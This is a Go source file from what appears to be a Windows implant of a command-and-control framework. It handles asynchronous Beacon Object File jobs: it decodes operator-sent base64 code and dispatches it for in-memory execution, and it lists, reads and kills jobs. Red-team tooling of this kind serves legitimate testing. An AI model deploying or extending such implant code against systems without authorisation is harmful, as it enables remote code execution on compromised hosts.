// server/docker/payloads/Windows/action_bof_async.go
//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"fmt"
	"runtime"
	"strings"
)

// BOFAsyncCommand handles async BOF execution
type BOFAsyncCommand struct{}

func (c *BOFAsyncCommand) Name() string {
	return "bof-async"
}

func (c *BOFAsyncCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if runtime.GOOS != "windows" {
		return CommandResult{
			Output:   "Error: BOF execution is only supported on Windows",
			Error:    fmt.Errorf("unsupported platform: %s", runtime.GOOS),
			ExitCode: 1,
		}
	}
	// Will be handled by processBOFAsync with full command data
	return CommandResult{
		Output:   "BOF async execution initiated",
		ExitCode: 0,
	}
}

// BOFJobsCommand lists async BOF jobs
type BOFJobsCommand struct{}

func (c *BOFJobsCommand) Name() string {
	return "bof-jobs"
}

func (c *BOFJobsCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if runtime.GOOS != "windows" {
		return CommandResult{
			Output:   "Error: BOF execution is only supported on Windows",
			ExitCode: 1,
		}
	}

	// Call platform-specific implementation
	return executeBOFJobsList()
}

// BOFOutputCommand retrieves output from an async BOF job
type BOFOutputCommand struct{}

func (c *BOFOutputCommand) Name() string {
	return "bof-output"
}

func (c *BOFOutputCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if runtime.GOOS != "windows" {
		return CommandResult{
			Output:   "Error: BOF execution is only supported on Windows",
			ExitCode: 1,
		}
	}

	if len(args) < 1 {
		return CommandResult{
			Output:   "Usage: bof-output <job_id>",
			ExitCode: 1,
		}
	}

	jobID := args[0]
	return executeBOFGetOutput(jobID)
}

// BOFKillCommand terminates an async BOF job
type BOFKillCommand struct{}

func (c *BOFKillCommand) Name() string {
	return "bof-kill"
}

func (c *BOFKillCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if runtime.GOOS != "windows" {
		return CommandResult{
			Output:   "Error: BOF execution is only supported on Windows",
			ExitCode: 1,
		}
	}

	if len(args) < 1 {
		return CommandResult{
			Output:   "Usage: bof-kill <job_id>",
			ExitCode: 1,
		}
	}

	jobID := args[0]
	return executeBOFKillJob(jobID)
}

// processBOFAsync handles async BOF execution (called from CommandQueue)
func (cq *CommandQueue) processBOFAsync(cmd Command) CommandResult {
	if runtime.GOOS != "windows" {
		return CommandResult{
			Command:  cmd,
			Output:   "Error: BOF execution is only supported on Windows",
			ExitCode: 1,
		}
	}

	// Decode BOF and parse arguments (reuse existing logic)
	bofBytes, err := base64.StdEncoding.DecodeString(cmd.Data)
	if err != nil {
		return CommandResult{
			Command:  cmd,
			Output:   fmt.Sprintf("Failed to decode BOF data: %v", err),
			Error:    err,
			ExitCode: 1,
		}
	}

	var bofArgs []byte
	if cmd.Command != "" && strings.HasPrefix(cmd.Command, "bof-async ") {
		argString := strings.TrimPrefix(cmd.Command, "bof-async ")
		if argString != "" {
			parsedArgs, err := parseBOFArguments(argString)
			if err != nil {
				fmt.Printf("[BOF Async] Warning: Failed to parse arguments: %v\n", err)
			} else {
				bofArgs = parsedArgs
			}
		}
	}

	// Execute async on Windows (platform-specific)
	return executeBOFAsyncPlatform(cmd, bofBytes, bofArgs)
}
